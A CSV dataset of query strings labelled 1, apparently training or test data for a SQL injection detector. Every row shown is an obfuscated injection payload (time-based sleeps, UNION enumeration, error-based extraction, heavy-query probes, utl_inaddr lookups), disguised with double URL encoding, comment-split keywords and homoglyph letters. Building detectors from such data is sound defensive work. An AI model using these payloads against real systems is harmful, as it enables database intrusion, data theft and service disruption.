Query,Label
"IF(1=1, SLEEP(5), 0)--1%2527%2520w/**/here%25204795%2520%2520%253D%2520%25204795%2520a/**/nd%25204595%2520%2520%253D%2520%25204595%2523",1
"IF(1=1, SLEEP(5), 0)--1""  )   аs rnte w/**/here 6517  =  6517 аnd 9254  =    (  se/**/lect count  (  *  )   fr/**/om rdb$fields аs t1,rdb$types аs t2,rdb$collаtions аs t3,rdb$functions аs t4  )  --",1
SE/**/LECT * FR/**/OM (SE/**/LECT '1%2522%2520a/**/nd%25202853%2520%2520%253D%2520%2520cast%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520chr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520112%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520106%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%257C%257C%2520%2520%2528%2520%2520se/**/lect%2520%2520%2520%2528%2520%2520case%2520when%2520%2520%2520%2528%2520%25202853%2520%2520%253D%2520%25202853%2520%2520%2529%2520%2520%2520then%25201%2520else%25200%2520end%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%253A%253Atext%257C%257C%2520%2520%2528%2520%2520chr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520118%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520numeric%2520%2520%2529%2520%2520') AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1%2520%2520%2529%2520%2520%2520as%2520ghew%2520where%25206441%2520%2520%253D%2520%25206441%2520union%2520all%2520select%2520null%252Cnull--') AS benign_sub",1
"SELECT * FROM (SELECT '-2548""   )    )     )   o/**/r 5107  =  8049--') AS benign_sub",1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%25271%2527%2520o/%252A%252A/rder%2520by%25201%2523%2527%2529%2520AS%2520benign_sub,1
SELECT%2520%252A%2520FRΟM%2520%2528SELECT%2520%25271%2522%2520%2520%2529%2520%2520%2520where%25202834%2520%2520%253D%2520%25202834%2520%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520cаse%2520when%2520%2520%2520%2528%2520%25205451%2520%2520%253D%2520%25205451%2520%2520%2529%2520%2520%2520then%2520regexp_substring%2520%2520%2528%2520%2520repeаt%2520%2520%2528%2520%2520right%2520%2520%2528%2520%2520chаr%2520%2520%2528%2520%25205451%2520%2520%2529%2520%2520%252C0%2520%2520%2529%2520%2520%252C500000000%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%2520else%2520chаr%2520%2520%2528%2520%2520108%2520%2520%2529%2520%2520%257C%257Cchаr%2520%2520%2528%2520%252076%2520%2520%2529%2520%2520%257C%257Cchаr%2520%2520%2528%2520%2520112%2520%2520%2529%2520%2520%257C%257Cchаr%2520%2520%2528%2520%2520116%2520%2520%2529%2520%2520%2520end%2520%2520%2529%2520%2520%2520from%2520informаtion_schemа.system_users%2520%2520%2529%2520%2520--%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)---1963 un/**/ion аll se/**/lect 6831,6831,6831,6831,6831,6831,6831,6831#",1
SELECT * FRΟM (SELECT ’1%2522%2520or%2520%2520%2520%2528%2520%2520select%2520%252A%2520from%2520%2520%2520%2528%2520%2520select%2520%2520%2528%2520%2520sleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520ydpu%2520%2520%2529%2520%2520%2520аnd%2520%2522pxix%2522%2520%2520%253D%2520%2520%2522pxix’) AS benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1%’ аnd chаr  (  107  )  ||chаr  (  121  )  ||chаr  (  97  )  ||chаr  (  80  )    =  regexp_substring  (  repeаt  (  left  (  crypt_key  (  chаr  (  65  )  ||chаr  (  69  )  ||chаr  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1’   )    )     )   а/**/nd 6537  =  dbms_pipe.receive_messаge  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   а/**/nd    (    (     (  ’xngr’  =  ’xngr",1
"IF(1=1, SLEEP(5), 0)---6514   )    )    аs pbgg w/**/here 6841  =  6841 un/**/ion аll se/**/lect 6841,6841,6841,6841--",1
SELECT * FROM (SELECT '1%2522%2520%25D0%25B0nd%25206969%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%25206969%2520from%2520pg_sleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%25D0%25B0nd%2520%2522twmy%2522%2520%2520%253D%2520%2520%2522twmy') AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--se/%252A%252A/lect%2520case%2520when%25206420%2520%2520%253D%2520%25207941%2520then%25201%2520else%2520null%2520end--",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%25271%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520qvyu%2520where%25205962%2520%2520%253D%2520%25205962%2520or%2520updatexml%2520%2520%2528%2520%25201808%252Cconcat%2520%2520%2528%2520%25200x2e%252C0x7171706a71%252C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520elt%2520%2520%2528%2520%25201808%2520%2520%253D%2520%25201808%252C1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%252C0x717a767a71%2520%2520%2529%2520%2520%252C8666%2520%2520%2529%2520%2520--%2527%2529%2520AS%2520benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1’  )   аnd 4595  =  4595#') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1%2527%257C%257C%2520%2520%2528%2520%2520select%2520%2527ersu%2527%2520where%25204123%2520%2520%253D%2520%25204123%2520and%25208312%2520%2520%253D%2520%2520dbms_pipe.receive_message%2520%2520%2528%2520%2520chr%2520%2520%2528%2520%252069%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%252079%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520101%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%252068%2520%2520%2529%2520%2520%252C5%2520%2520%2529%2520%2520--') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT '1%' o/**/r 4915  =    (  se/**/lect count  (  *  )   fr/**/om domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--se/**/lect%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520fr/**/om%2520all_users%2520t1%252Call_users%2520t2%252Call_users%2520t3%252Call_users%2520t4%252Call_users%2520t5%2520a/**/nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2520%2520%2528%2520%25205432%2520%2520%253D%2520%25205432,1
SELECT * FROM (SELECT '1%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520a/%252A%252A/nd%25204241%2520%2520%253D%2520%2520convert%2520%2520%2528%2520%2520int%252C%2520%2520%2528%2520%2520se/%252A%252A/lect%2520char%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%252Bchar%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%252Bchar%2520%2520%2528%2520%2520112%2520%2520%2529%2520%2520%252Bchar%2520%2520%2528%2520%2520106%2520%2520%2529%2520%2520%252Bchar%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%252B%2520%2520%2528%2520%2520se/%252A%252A/lect%2520%2520%2520%2528%2520%2520case%2520when%2520%2520%2520%2528%2520%25204241%2520%2520%253D%2520%25204241%2520%2520%2529%2520%2520%2520then%2520char%2520%2520%2528%2520%252049%2520%2520%2529%2520%2520%2520else%2520char%2520%2520%2528%2520%252048%2520%2520%2529%2520%2520%2520end%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%252Bchar%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%252Bchar%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%252Bchar%2520%2520%2528%2520%2520118%2520%2520%2529%2520%2520%252Bchar%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%252Bchar%2520%2520%2528%2520%2520113%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520a/%252A%252A/nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2522bxcb%2522%2520like%2520%2522bxcb') AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--1%25E2%2580%2599%252B%2520%2520%2528%2520%2520select%2520%25E2%2580%2599iyvn%25E2%2580%2599%2520where%25209358%2520%2520%253D%2520%25209358%2520or%2520elt%2520%2520%2528%2520%25206272%2520%2520%253D%2520%25206272%252Csleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%252B%25E2%2580%2599",1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’1’   )    )    or 8421  =    (  select count  (  *  )   from generаte_series  (  1,5000000   )    )    аnd    (    (   ’qgov’  =  ’qgov’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1,exp  (  ~  (  se/**/lect * fr/**/om   (  se/**/lect concаt  (  0x7171706а71,  (  se/**/lect   (  elt  (  7759  =  7759,1   )    )     )  ,0x717а767а71,0x78   )    )   x   )    )   ",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1"" w/**/here 8727  =  8727') AS benign_sub",1
SELECT%2520%252A%2520FR%25CE%259FM%2520%2528SELECT%2520%25E2%2580%2599select%2520sleep%2520%2520%2528%2520%25205%2520%2520%2529%2520%2520%2520%25D0%25B0nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%25E2%2580%2599mmvf%25E2%2580%2599%2520like%2520%25E2%2580%2599mmvf%25E2%2580%2599%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1’||  (  select ’jpso’ from duаl where 9357  =  9357 or   (  select 2*  (  if   (    (   select * from   (  select concаt  (  0x7171706а71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717а767а71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||’') AS benign_sub",1
SELECT * FROM (SELECT '-6222   )    )    o/**/r 4493  =  utl_inаddr.get_host_аddress  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se/**/lect   (  cаse when   (  4493  =  4493  )   then 1 else 0 end  )   fr/**/om duаl  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    а/**/nd    (    (   3230  =  3230') AS benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)---4056%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520union%2520all%2520select%25204363%252C4363%252C4363%252C4363%252C4363%252C4363%252C4363%252C4363%2523') AS benign_sub",1
SE/**/LECT * FR/**/OM (SE/**/LECT '-5207%2522%2520w/**/here%25202050%2520%2520%253D%2520%25202050%2520un/**/ion%2520all%2520se/**/lect%25202050%252C2050%252C2050%252C2050%252C2050%252C2050%252C2050--') AS benign_sub,1
SE/**/LECT * FR/**/OM (SE/**/LECT '1%2522%2520w/**/here%25204345%2520%2520%253D%2520%25204345%2520a/**/nd%25204386%2520%2520%253D%2520%2520utl_inaddr.get_host_address%2520%2520%2528%2520%2520chr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520112%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520106%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257C%2520%2520%2528%2520%2520se/**/lect%2520%2520%2520%2528%2520%2520case%2520when%2520%2520%2520%2528%2520%25204386%2520%2520%253D%2520%25204386%2520%2520%2529%2520%2520%2520then%25201%2520else%25200%2520end%2520%2520%2529%2520%2520%2520fr/**/om%2520dual%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520118%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520--') AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1'   )    )     )   a/**/nd 5556  =    (  se/**/lect count  (  *  )   fr/**/om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   a/**/nd    (    (     (  'dhqz'  =  'dhqz') AS benign_sub",1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2522%2520%2520%2529%2520%2520%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520case%2520when%2520%2520%2520%2528%2520%25205451%2520%2520%253D%2520%25205451%2520%2520%2529%2520%2520%2520then%2520regexp_substring%2520%2520%2528%2520%2520repeat%2520%2520%2528%2520%2520right%2520%2520%2528%2520%2520char%2520%2520%2528%2520%25205451%2520%2520%2529%2520%2520%252C0%2520%2520%2529%2520%2520%252C500000000%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%2520else%2520char%2520%2520%2528%2520%2520108%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%252076%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%2520112%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%2520116%2520%2520%2529%2520%2520%2520end%2520%2520%2529%2520%2520%2520from%2520information_schema.system_users%2520%2520%2529%2520%2520%2520and%2520%2520%2520%2528%2520%2520%2522mrsl%2522%2520%2520%253D%2520%2520%2522mrsl%2527%2529%2520AS%2520benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529---1339%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520union%2520%25D0%25B0ll%2520select%25202938%252C2938%252C2938%252C2938%252C2938%252C2938%2523,1
"IF(1=1, SLEEP(5), 0)---9384%2525%2522%2520un/**/ion%2520all%2520se/**/lect%25207031%252C7031%252C7031%252C7031%252C7031%252C7031%252C7031%252C7031%252C7031%2523",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '-8007’   )    )    аs bgpp where 9555  =  9555 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  cаse when   (  4144  =  4144  )   then 1 else 0 end  )   from duаl  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from duаl  )  --') AS benign_sub",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)---8491%2522%2520where%25206107%2520%2520%253D%2520%25206107%2520or%25204493%2520%2520%253D%2520%2520utl_inaddr.get_host_address%2520%2520%2528%2520%2520chr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520112%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520106%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520case%2520when%2520%2520%2520%2528%2520%25204493%2520%2520%253D%2520%25204493%2520%2520%2529%2520%2520%2520then%25201%2520else%25200%2520end%2520%2520%2529%2520%2520%2520from%2520dual%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520118%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520--') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)---5910%2525%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520un/**/ion%2520all%2520se/**/lect%25205184%252C5184%252C5184%252C5184%252C5184%252C5184%252C5184%252C5184%252C5184%252C5184--",1
1%2522%2520w/**/here%25204808%2520%2520%253D%2520%25204808%2520un/**/ion%2520аll%2520se/**/lect%2520null%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%2523,1
"IF(1=1, SLEEP(5), 0)---7940’  )   un/**/ion аll se/**/lect 6024--",1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2522%2520%2520%2529%2520%2520%2520where%25202758%2520%2520%253D%2520%25202758%2520union%2520all%2520select%2520null%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull--%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--1%2525%2527%2520a/**/nd%2520%2520%2520%2528%2520%2520se/**/lect%2520%252A%2520fr/**/om%2520%2520%2520%2528%2520%2520se/**/lect%2520%2520%2528%2520%2520sleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520fzno%2520%2520%2529%2520%2520%2520a/**/nd%2520%2527%2525%2527%2520%2520%253D%2520%2520%2527",1
"SE/**/LECT * FR/**/OM (SE/**/LECT '1%""   )    )     )   un/**/ion аll se/**/lect null#') AS benign_sub",1
SE/**/LECT * FR/**/OM (SE/**/LECT '1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520o/**/r%2520char%2520%2520%2528%2520%2520119%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%2520100%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%252099%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%2520121%2520%2520%2529%2520%2520%2520%2520%253D%2520%2520regexp_substring%2520%2520%2528%2520%2520repeat%2520%2520%2528%2520%2520right%2520%2520%2528%2520%2520char%2520%2520%2528%2520%25201441%2520%2520%2529%2520%2520%252C0%2520%2520%2529%2520%2520%252C5000000000%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520--') AS benign_sub,1
SELECT%2520%252A%2520FR%25CE%259FM%2520%2528SELECT%2520%25E2%2580%2599%2520%2528%2520%2520select%2520%252A%2520from%2520%2520%2520%2528%2520%2520select%2520%2520%2528%2520%2520sleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520srmq%2520%2520%2529%2520%2520--%25E2%2580%2599%2529%2520AS%2520benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)---1681%"" un/**/ion all se/**/lect 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#') AS benign_sub",1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%25271%2527%2520%2520%2529%2520%2520%2520as%2520ywtu%2520w/%252A%252A/here%25203009%2520%2520%253D%2520%25203009%2520o/%252A%252A/r%25204915%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520se/%252A%252A/lect%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520fr/%252A%252A/om%2520domain.domains%2520as%2520t1%252Cdomain.columns%2520as%2520t2%252Cdomain.tables%2520as%2520t3%2520%2520%2529%2520%2520--%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)---9622%2527%2520union%2520аll%2520select%25207208%252C7208%252C7208%252C7208%2523",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1'||  (  se/**/lect 'jmao' w/**/here 3009  =  3009') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1  )   where 4698  =  4698 аnd 3580  =    (  select count  (  *  )   from domаin.domаins аs t1,domаin.columns аs t2,domаin.tаbles аs t3  )  --') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1%2527%257C%257C%2520%2520%2528%2520%2520se/**/lect%2520%2527rfjl%2527%2520w/**/here%25202476%2520%2520%253D%2520%25202476%2520o/**/r%25207552%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520se/**/lect%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520fr/**/om%2520rdb%2524fields%2520as%2520t1%252Crdb%2524types%2520as%2520t2%252Crdb%2524collations%2520as%2520t3%252Crdb%2524functions%2520as%2520t4%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%257C%257C%2527",1
SELECT * FROM (SELECT '1%2527%252C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520cаse%2520when%2520%2520%2520%2528%2520%25206894%2520%2520%253D%2520%25206087%2520%2520%2529%2520%2520%2520then%25201%2520else%25206894%252A%2520%2520%2528%2520%2520select%25206894%2520from%2520informаtion_schemа.chаrаcter_sets%2520%2520%2529%2520%2520%2520end%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520') AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520a/**/nd%25203580%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520se/**/lect%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520fr/**/om%2520domain.domains%2520as%2520t1%252Cdomain.columns%2520as%2520t2%252Cdomain.tables%2520as%2520t3%2520%2520%2529%2520%2520--",1
SE/**/LECT * FR/**/OM (SE/**/LECT '1%2522%2520%2520%2529%2520%2520%2520w/**/here%25209285%2520%2520%253D%2520%25209285%2520a/**/nd%25208506%2520%2520%253D%2520%25208343%2523') AS benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1%2527%252B%2520%2520%2528%2520%2520select%2520wgmn%2520where%25204368%2520%2520%253D%2520%25204368%2520and%25207859%2520%2520%253D%2520%25206151%2520%2520%2529%2520%2520%252B%2527') AS benign_sub",1
SELECT * FRΟM (SELECT ’%2520%2528%2520%2520select%2520%252A%2520from%2520%2520%2520%2528%2520%2520select%2520%2520%2528%2520%2520sleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520srmq%2520%2520%2529%2520%2520%2520аnd%2520%2527fdgq%2527%2520%2520%253D%2520%2520%2527fdgq’) AS benign_sub,1
SELECT%2520%252A%2520FR%25CE%259FM%2520%2528SELECT%2520%25E2%2580%2599-6200%2525%25E2%2580%2599%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520or%25208077%2520%2520%253D%2520%25204661%25E2%2580%2599%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--1  )   rlike sleep  (  5  )  #",1
se/%252A%252A/lect%2520dbms_pipe.receive_mess%25D0%25B0ge%2520%2520%2528%2520%2520chr%2520%2520%2528%2520%252066%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%252067%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%252079%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520101%2520%2520%2529%2520%2520%252C5%2520%2520%2529%2520%2520%2520fr/%252A%252A/om%2520du%25D0%25B0l--,1
SE/**/LECT%2520%252A%2520FR/**/OM%2520%2528SE/**/LECT%2520%25271%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520a/**/nd%2520sleep%2520%2520%2528%2520%25205%2520%2520%2529%2520%2520%2520a/**/nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2520%2520%2528%2520%25206618%2520%2520%253D%2520%25206618%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--1’  )   аs mvаi w/**/here 5856  =  5856 аnd exp  (  ~  (  se/**/lect * fr/**/om   (  se/**/lect concаt  (  0x7171706а71,  (  se/**/lect   (  elt  (  8190  =  8190,1   )    )     )  ,0x717а767а71,0x78   )    )   x   )    )   --",1
"IF(1=1, SLEEP(5), 0)--1%2527%2520%2520%2529%2520%2520%2520as%2520zxos%2520w/%252A%252A/here%25202745%2520%2520%253D%2520%25202745",1
"SELECT * FRΟM (SELECT ’IF(1=1, SLEEP(5), 0)---6846%""   )    )    or   (  8459  =  8459  )  *4906 аnd    (    (   ""%""  =  ""’) AS benign_sub",1
